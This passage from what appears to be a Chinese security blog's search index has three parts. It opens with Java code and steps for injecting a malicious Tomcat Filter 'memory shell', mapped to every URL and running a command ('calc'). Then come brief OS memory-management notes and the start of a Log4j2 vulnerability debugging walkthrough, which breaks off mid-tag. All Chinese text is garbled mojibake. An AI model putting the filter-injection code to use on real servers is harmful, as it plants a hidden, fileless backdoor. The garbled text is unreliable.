class="string">&quot;calc&quot;</span>);</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">//                     initæ–¹æ³•å¿…é¡»å†™ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//                    destoryæ–¹æ³•å¿…é¡»å†™ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;;</span><br><span class="line">            filterDef.setFilter(evilFilter);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">            filterDef.setFilterName(filterName);</span><br><span class="line">            filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">            <span class="comment">//å°†FilterDefæ·»åŠ åˆ°FilterDefs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;å°†FilterDefæ·»åŠ åˆ°FilterDefs&quot;</span>);</span><br><span class="line">            context1.addFilterDef(filterDef);</span><br><span class="line"><span class="comment">//            è·å–filterConfigå¹¶æ·»åŠ åˆ°filterConfigs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è·å–filterConfigå¹¶æ·»åŠ åˆ°filterConfigs&quot;</span>);</span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(1);</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> declaredConstructor.newInstance(context1, filterDef);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(2);</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) filterConfigs.get(context1);</span><br><span class="line">            map.put(filterName, applicationFilterConfig);</span><br><span class="line"><span class="comment">//            å°†filterMapæ·»åŠ åˆ°StandardContext</span></span><br><span class="line">            System.out.println(<span class="string">&quot;å°†filterMapæ·»åŠ åˆ°StandardContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(filterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            context1.addFilterMapBefore(filterMap);</span><br><span class="line">            System.out.println(<span class="string">&quot;å†…å­˜é©¬æ³¨å…¥æˆåŠŸ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>è¦å®ç°ä¸€ä¸ªFilterç±»å‹çš„å†…å­˜é©¬ï¼Œå¿…è¦è¦å®Œæˆä»¥ä¸‹çš„æ­¥éª¤</p>
<ul>
<li>è·å–StandardContextå¯¹è±¡</li>
<li>å†™ä¸€ä¸ªæ¶æ„FIlter</li>
<li>å°†æ¶æ„FilteråŠ å…¥åˆ°FilterDefä¸­</li>
<li>å°†FIlterDefåŠ å…¥åˆ°FilterDefsä¸­</li>
<li>å°†FilterDefså°è£…åˆ°FilterConfigä¸­</li>
<li>å°†FilterCOnfigå°è£…åˆ°FilterConfigsä¸­</li>
<li>æ·»åŠ FIlter Parttern</li>
</ul>
<p>é¦–å…ˆè¦è·å–Standardå¯¹è±¡<br>åˆ©ç”¨IDEAçš„Evaluateå·¥å…·æˆ‘ä»¬å¯ä»¥çŸ¥é“req.getSession().getServletContext()çš„æ‰§è¡Œç»“æœæ˜¯ä¸€ä¸ªApplicationContextFacadeå¯¹è±¡ï¼Œåœ¨å…¶ä¸­æœ‰ä¸€ä¸ªContextå±æ€§ä¸ºAPplicationContextç±»å‹çš„å¯¹è±¡ï¼Œè¿™ä¸ªAPplicationContextç±»å‹çš„å¯¹è±¡ä¸­æœ‰æœ‰ä¸€ä¸ªå±æ€§contextä¸ºStrandardContextç±»å‹çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b4d18b39f0e89dee214586de0bf6155c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ä¸¤æ¬¡åå°„å°±å¯ä»¥è·å–åˆ°è¯¥StandardContextå¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰å¦ä¸€ç§è·å–åˆ°StandardContextå¯¹è±¡çš„æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡requestå¯¹è±¡è·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">request</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">request.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) request.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
<p>å—¯ï¼Œå°±è¿™ä¹ˆå¤šæƒ³è¯´çš„ï¼Œåé¢çš„çœ‹ä»£ç å°±å¥½äº†ï¼Œä¸»è¦å°±æ˜¯æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ¥æ³¨å…¥å°±è¡Œäº†ï¼Œè¿™é‡Œæ³¨æ„æ¶æ„çš„Filterç±»å¿…é¡»æ˜¾å¼çš„é‡å†™initä¸destoryæ–¹æ³•ï¼Œå¦åˆ™ä½ ä¼šå‘ç°æ€ä¹ˆéƒ½æ³¨å…¥ä¸æˆåŠŸï¼Œå½“ç„¶è¿™éƒ½æ˜¯æˆ‘è¸©è¿‡çš„å‘ï¼Œæµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ©ç”¨</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>å†…å­˜é©¬</tag>
        <tag>filter</tag>
      </tags>
  </entry>
  <entry>
    <title>æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†</title>
    <url>/archives/3c5272d9.html</url>
    <content><![CDATA[<h1 id="è¿ç»­å†…å­˜ç®¡ç†"><a href="#è¿ç»­å†…å­˜ç®¡ç†" class="headerlink" title="è¿ç»­å†…å­˜ç®¡ç†"></a>è¿ç»­å†…å­˜ç®¡ç†</h1><h2 id="æœ€ä¼˜ç®—æ³•"><a href="#æœ€ä¼˜ç®—æ³•" class="headerlink" title="æœ€ä¼˜ç®—æ³•"></a>æœ€ä¼˜ç®—æ³•</h2><p>å¯»æ‰¾ä¸æ‰€éœ€å†…å­˜æœ€ç›¸è¿‘çš„å¿«</p>
<h2 id="æœ€å·®å†…å­˜ç®—æ³•"><a href="#æœ€å·®å†…å­˜ç®—æ³•" class="headerlink" title="æœ€å·®å†…å­˜ç®—æ³•"></a>æœ€å·®å†…å­˜ç®—æ³•</h2><p>æ‰¾æœ€å¤§çš„ç©ºé—²å—</p>
<h2 id="æœ€è¿‘å†…å­˜ç®—æ³•"><a href="#æœ€è¿‘å†…å­˜ç®—æ³•" class="headerlink" title="æœ€è¿‘å†…å­˜ç®—æ³•"></a>æœ€è¿‘å†…å­˜ç®—æ³•</h2><p>æ‰¾æœ€è¿‘çš„å¯ç”¨ç©ºé—²å—</p>
<h2 id="ç¢ç‰‡ç®¡ç†"><a href="#ç¢ç‰‡ç®¡ç†" class="headerlink" title="ç¢ç‰‡ç®¡ç†"></a>ç¢ç‰‡ç®¡ç†</h2><p>ä¸Šè¿°ä¸‰ç§ç®—æ³•å‡æ— æ³•è§£å†³å†…å­˜ä¸­å‡ºç°çš„å†…ç¢ç‰‡ä¸å¤–ç¢ç‰‡é—®é¢˜ï¼Œå¼€å¤´é€šè¿‡å‹ç¼©ç®—æ³•ä¸äº¤æ¢ç®—æ³•æ¥è¿›è¡Œç¼“è§£ã€‚</p>
<h1 id="éè¿ç»­å†…å­˜ç®¡ç†"><a href="#éè¿ç»­å†…å­˜ç®¡ç†" class="headerlink" title="éè¿ç»­å†…å­˜ç®¡ç†"></a>éè¿ç»­å†…å­˜ç®¡ç†</h1><h2 id="åˆ†æ®µ"><a href="#åˆ†æ®µ" class="headerlink" title="åˆ†æ®µ"></a>åˆ†æ®µ</h2><p>é€šè¿‡æ®µå·ä¸æ®µå†…åç§»æ¥å®ç°è™šæ‹Ÿå†…å­˜åœ°å€ä¸ç‰©ç†å†…å­˜åœ°å€ä¹‹é—´çš„æ˜ å°„ï¼Œåˆ†æ®µç®—æ³•æ®µçš„å¤§å°ä¸æ˜¯å›ºå®šçš„æ˜¯å¯å˜çš„ã€‚</p>
<h2 id="åˆ†é¡µ"><a href="#åˆ†é¡µ" class="headerlink" title="åˆ†é¡µ"></a>åˆ†é¡µ</h2><h3 id="æ­£å‘é¡µè¡¨"><a href="#æ­£å‘é¡µè¡¨" class="headerlink" title="æ­£å‘é¡µè¡¨"></a>æ­£å‘é¡µè¡¨</h3><p>é€šè¿‡é€»è¾‘å†…å­˜åœ°å€æŸ¥æ‰¾ç‰©ç†å†…å­˜åœ°å€ï¼Œå³é€šè¿‡é¡µå·æŸ¥æ‰¾å¸§å·ã€‚<br>é€šè¿‡é¡µè¡¨æ¥ç®¡ç†å†…å­˜ï¼Œé¡µè¡¨ä¸­å­˜å‚¨äº†é¡µå·ä¸å¸§å·çš„æ˜ å°„å…³ç³»ï¼ŒCPUé€šè¿‡è™šæ‹Ÿå†…å­˜çš„é¡µå·æ¥æŸ¥æ‰¾å¯¹åº”ç‰©ç†å†…å­˜åœ°å€çš„å¸§å·ï¼Œç„¶ååŠ ä¸Šåç§»åœ°å€æ¥è·å–ç‰©ç†å†…å­˜åœ°å€<br>é¡µè¡¨çš„å¤§å°æ˜¯å›ºå®šçš„</p>
<h3 id="åå‘é¡µè¡¨"><a href="#åå‘é¡µè¡¨" class="headerlink" title="åå‘é¡µè¡¨"></a>åå‘é¡µè¡¨</h3><p>é€šè¿‡å¸§å·æ¥æŸ¥æ‰¾é¡µå·</p>
<h1 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h1><h2 id="è¦†ç›–æŠ€æœ¯"><a href="#è¦†ç›–æŠ€æœ¯" class="headerlink" title="è¦†ç›–æŠ€æœ¯"></a>è¦†ç›–æŠ€æœ¯</h2><p>ç”±ç¨‹åºå‘˜å†³å®šï¼Œå“ªäº›æ¨¡å—å…ˆè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä»è€Œå®ç°å†…å­˜ä½¿ç”¨çš„ä¼˜åŒ–</p>
<h2 id="äº¤æ¢æŠ€æœ¯"><a href="#äº¤æ¢æŠ€æœ¯" class="headerlink" title="äº¤æ¢æŠ€æœ¯"></a>äº¤æ¢æŠ€æœ¯</h2><p>å°†ä¸ä½¿ç”¨çš„ç¨‹åºæ¢å‡ºé“ç¡¬ç›˜ä¸­</p>
<h2 id="è™šæ‹Ÿå†…å­˜-1"><a href="#è™šæ‹Ÿå†…å­˜-1" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h2><p>å°†ç¨‹åºçš„ä¸€éƒ¨åˆ† ä¸ä½¿ç”¨çš„å†…å®¹æ”¾åˆ°ç¡¬ç›˜ä¸­</p>
<h3 id="æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•"><a href="#æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•" class="headerlink" title="æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•"></a>æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•</h3><p>ç½®æ¢åˆ°ä¸‹ä¸€æ¬¡ä½¿ç”¨æ—¶é—´æœ€é•¿çš„é¡µã€‚å› æ— æ³•çš„å€¼ä¸‹ä¸€æ¬¡ä½¿ç”¨çš„æ—¶é—´ï¼Œæ‰€ä»¥è¯¥ç®—æ³•å¤šç”¨æ¥ä½œä¸ºè¡¡é‡å…¶ä»–ç®—æ³•æ•ˆæœçš„æ ‡å‡†</p>
<h3 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h3><p>å…ˆä½¿ç”¨çš„é¡µè¢«æœ€å…ˆç½®æ¢</p>
<h3 id="æœ€é•¿æœªä½¿ç”¨æ—¶é—´ç®—æ³•"><a href="#æœ€é•¿æœªä½¿ç”¨æ—¶é—´ç®—æ³•" class="headerlink" title="æœ€é•¿æœªä½¿ç”¨æ—¶é—´ç®—æ³•"></a>æœ€é•¿æœªä½¿ç”¨æ—¶é—´ç®—æ³•</h3><p>ç»´æŠ¤ä¸€ä¸ªé“¾è¡¨æˆ–è€…æ ˆå­˜æ”¾æ¯ä¸€ä¸ªé¡µè¢«ä½¿ç”¨çš„é¡ºåºï¼Œæ¯æ¬¡éƒ½å°†æœ€é•¿æ—¶é—´æœªè¢«ä½¿ç”¨çš„é¡µç½®æ¢å‡ºå»ã€‚æ¯ä¸€æ¬¡è®¿é—®ä¸åŒçš„é¡µéƒ½å°†æŸ¥è¯¢ä¸€æ¬¡é“¾è¡¨å¹¶æ›´æ¢é¡ºåºï¼Œå¼€é”€è¾ƒå¤§</p>
<h3 id="æ—¶é’Ÿç½®æ¢ç®—æ³•"><a href="#æ—¶é’Ÿç½®æ¢ç®—æ³•" class="headerlink" title="æ—¶é’Ÿç½®æ¢ç®—æ³•"></a>æ—¶é’Ÿç½®æ¢ç®—æ³•</h3><p>ç»´æŠ¤ä¸€ä¸ªç¯å½¢é“¾è¡¨ï¼Œæ¯ä¸€ä¸ªä½ç½®ä¸Šè®°å½•æŸä¸€ä¸ªé¡µè¡¨åœ¨ä¸€å®šæ—¶é—´å†…æ˜¯å¦è¢«è®¿é—®ï¼Œç»´æŠ¤ä¸€ä¸ªæŒ‡é’ˆï¼Œæ²¡å½“å‘ç”Ÿé¡µè¡¨è®¿é—®æ—¶å°†æ ‡å¿—ä½ç½®ä¸º1è¡¨ç¤ºè¯¥é¡µè¡¨è¢«è®¿é—®è¿‡äº†ï¼Œå½“å‘ç”Ÿç¼ºé¡µä¸­æ–­æ—¶ï¼Œè¯¥æŒ‡é’ˆæŒ‰ç…§ä¸€å®šæ–¹å‘ç§»åŠ¨ï¼Œå¦‚æœå½“å‰é¡µè¡¨çš„æ ‡å¿—ä½ä¸º1ï¼Œåˆ™å°†å…¶ç½®ä¸º0ï¼Œå†è®¿é—®ä¸‹ä¸€ä¸ªä½ç½®ï¼Œç›´åˆ°æ‰¾åˆ°æ ‡å¿—ä½ä¸º0çš„é¡µè¡¨ï¼Œå¹¶å°†è¯¥é¡µè¡¨ç½®æ¢å‡ºå»ã€‚</p>
<h3 id="æœ€ä¸å¸¸ç”¨ç®—æ³•"><a href="#æœ€ä¸å¸¸ç”¨ç®—æ³•" class="headerlink" title="æœ€ä¸å¸¸ç”¨ç®—æ³•"></a>æœ€ä¸å¸¸ç”¨ç®—æ³•</h3><p>æ·˜æ±°ä½¿ç”¨æ¬¡æ•°æœ€å°‘çš„é¡µ</p>
]]></content>
      <categories>
        <category>æ“ä½œç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
        <tag>å†…å­˜ç®¡ç†</tag>
        <tag>é¡µè¡¨</tag>
        <tag>è™šæ‹Ÿå†…å­˜</tag>
        <tag>å†…å­˜äº¤æ¢</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å‰–æLog4j2è°ƒç”¨æµç¨‹</title>
    <url>/archives/a60aa68e.html</url>
    <content><![CDATA[<p>@<a href="%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90Log4j2%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B">TOC</a></p>
<blockquote>
<p><b><font color="red">ç”³æ˜ï¼š</font></b>æœ¬æ–‡åªåšå­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä¸¥ç¦ä»»ä½•ç»„ç»‡å’Œä¸ªäººé€šè¿‡è½¬å‘ã€è½¬è½½ç­‰æ–¹å¼è¿›è¡Œä¼ æ’­ï¼Œå› æ­¤å¯¼è‡´çš„æ³•å¾‹åæœä¸æœ¬æ–‡ä½œè€…æ— å…³ã€‚</p>
</blockquote>
<p>å°èœé¸¡æ˜¨æ™šæ­£åœ¨ç§¯æè¿›è¡¥é›·ç¥å¤§å¤§çš„è¯¾ç¨‹çš„æ—¶å€™ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7a29e750df12950a939abb3ac4b60a21.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€æ¿çš„æ¶ˆæ¯åˆ’ç ´äº†å¯‚é™çš„å¤œç©ºï¼Œä¹Ÿæ‰“æ–­äº†æˆ‘å­¦ä¹ çš„è„šæ­¥ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/512baf9e23209af67cd6f42175fa1b99.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŒ‰ç…§æˆ‘çš„å°¿æ€§ï¼Œè¿™ç§æ—¶å€™æˆ‘è‚¯å®šå·å·è£…æ­»æ²¡è·‘äº†ã€‚<br>ä¸è¿‡è¿™ä¸ªæ¼æ´è¿˜æ˜¯å¼•èµ·äº†æˆ‘çš„å…´è¶£ï¼Œæ¯•ç«Ÿçƒ­åº¦å°±é‚£ä¹ˆå¤šï¼Œè¹­ä¸€è¹­å°±æ²¡æœ‰äº†ï¼Œæˆ‘è‚¯å®šä¹Ÿè¦è¹­ä¸€è¹­äº†ã€‚äºæ˜¯åœ¨æ˜¨æ™šçæ•´äº†ä¸€æ™šä¸Šæ²¡ç»“æœåï¼Œä»Šå¤©ä¸Šç­çš„æ—¶å€™åˆ’æ°´å°±æŠŠè¿™æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ç»™è·‘é€šäº†â€¦..<br>æœç„¶ä¸Šç­åˆ’æ°´æ‰æ˜¯ç”Ÿäº§åŠ›å•Šã€‚</p>
<span id="more"></span>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨mavenè¿›è¡Œé¡¹ç›®ç®¡ç†ï¼Œæ­å»ºæ¼æ´ç¯å¢ƒï¼š<br>åœ¨pom.xmlä¸­å¼•å…¥ä¸‹é¢çš„ä¸¤ä¸ªä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¼æ´å­˜åœ¨çš„ç‰ˆæœ¬å°±æ‡’å¾—è¯´äº†ï¼Œåæ­£ä¸æ˜¯æœ€æ–°ç‰ˆå°±å¯¹äº†ï¼Œæ‰‹åŠ¨ç‹—å¤´ï¼ï¼<br>ç„¶åå†™ä¸ªå°é¡µé¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.log4j2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span>  LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;payloadæ‰‹åŠ¨æ‰“ç &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰“æ–­ç‚¹ç›´æ¥å¼€å§‹è°ƒè¯•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/92ef54f1b81f34febe364524cf063e15.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·³è¿›å»ï¼Œæ‡‚çš„éƒ½æ‡‚ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1679d2a2bc9c9de40ecf28d36a1070cc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ°äº†è¿™å„¿åæ®è¯´æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ­¥éª¤ï¼Œè°ƒç”¨<code>logIfEnabled</code>æ–¹æ³•åˆ¤æ–­æ˜¯å¦å¯ç”¨æ—¥å¿—è®°å½•ï¼Œè¿™é‡Œçš„æ—¥å¿—è®°å½•åˆ†ä¸ºä¸åŒçš„ç­‰çº§ï¼Œå¯ä»¥åœ¨log4j2çš„é…ç½®æ–‡ä»¶log4j2.propertiesä¸­è¿›è¡Œé…ç½®æ—¥å¿—è®°å½•çš„çº§åˆ«ã€‚<br>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›è¯¥æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/729130e9fa14957c6e2b815d1b31c7c6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è™½ç„¶ä¸çŸ¥é“<code>logMessage</code>å‡½æ•°å¹²ä»€ä¹ˆçš„ï¼Œä¸è¿‡è‚¯å®šä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œç»§ç»­è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f31c2dfe441cc6dfb5b1e9c32bdb7a1a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>logMessageSafely</code>å‡½æ•°ï¼Œç¿»è¯‘ä¸€ä¸‹å°±æ˜¯æ—¥å¿—ä¿¡æ¯å®‰å…¨æ€§ï¼ŒçŒœä¸€ä¸‹å¯èƒ½æ˜¯è¿›è¡Œå®‰å…¨æ€§åˆ¤æ–­çš„å§ï¼Ÿå› ä¸ºæ˜¯ä»é›¶å¼€å§‹çš„æœŸé—´æˆ‘è¿˜è·Ÿè¿›äº†newMessageå‡½æ•°ï¼Œå‘ç°æ˜¯å°†æˆ‘ä»¬çš„messageå°è£…æˆäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹æˆ‘ä»¬çš„ç›®æ ‡æ²¡æœ‰å¤§çš„å½±å“ï¼Œ è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/55b52ab3475ace84ea0be5261d33948a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°±æƒ³è¿™æ ·ï¼Œå°†messageå°è£…è¿›äº†ä¸€ä¸ª<code>ReusableSimpleMessage</code>å¯¹è±¡ï¼Œç»§ç»­å›åˆ°<code>logMessageSafely</code>å‡½æ•°è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/02c3d13d06be439ccfff0bc1e451d194.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›<code>logMessageTrackRecursion</code>å‡½æ•°ï¼Œä¸æ‡‚å°±é—®recursionä»€ä¹ˆæ„æ€ï¼Ÿæ‰€ä»¥æˆ‘æŠ½ç©ºå»æœ‰é“æŸ¥äº†ä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6cdb98d468bfff0259e7da92d31b8c95.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‡½æ•°åç¿»è¯‘è¿‡æ¥å°±æ˜¯æ—¥å¿—ä¿¡æ¯è·Ÿè¸ªé€’å½’ï¼Œä»€ä¹ˆæ„æ€ï¼Ÿä¿ºä¹Ÿä¸çŸ¥é“ï¼Œç»§ç»­è·Ÿè¿›ï¼š</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/701069406622e415d2b25b3c7798b2d3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å“¦è±ï¼ŒåŸæ¥å°±åœ¨ä¸‹é¢ï¼Œè·Ÿè¿›å‡½æ•°<code>tryLogMessage</code>ï¼Œè€è§„çŸ©è¿˜æ˜¯ç¿»è¯‘ä¸€ä¸‹ï¼Œæ•è·æ—¥å¿—ä¿¡æ¯ï¼Œè¿˜æ˜¯ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯åˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œç»§ç»­è·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/98636e80eb9cc3fce6b1e17cf058713a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç®¡ä»–ä»€ä¹ˆå‘¢ï¼Œæ— è„‘ç»§ç»­è·Ÿï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/39d5b64d2dba6ca930f9611576bfc86d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆèƒ½æ€ä¹ˆæ ·å‘¢ï¼Œç»§ç»­ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/60380af23a7bfce5738d606173e194ec.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¥½çƒ¦å•Šï¼Œæ— é™å¥—å¨ƒï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b789a326b70d2fb87c02d77bf7556660.png" 